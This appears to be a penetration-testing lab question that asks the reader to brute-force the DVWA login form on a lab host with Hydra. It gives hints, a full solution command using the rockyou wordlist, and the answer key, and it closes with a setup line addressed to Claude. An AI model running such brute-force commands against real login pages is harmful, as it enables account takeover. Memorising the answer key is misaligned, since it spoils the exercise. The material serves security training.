# Q276 — Brute Force Web Login Form Using Hydra

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `hydra` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Brute force DVWA login form using Hydra http-post-form module. You need to specify the correct POST data and failure string."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>
```

---

## 💡 Hints

**Hint 1**

`hydra -l admin -P wordlist target http-post-form "/path:post_data:failure_string"`

**Hint 2**

DVWA failure string: "Login failed"

---

## ✅ Solution

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.52.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4
```

**Answer:** `user=admin; password=password`

---

## 🤖 Claude Setup Prompt

Ensure DVWA accessible. Report back: "Lab ready for Q276"
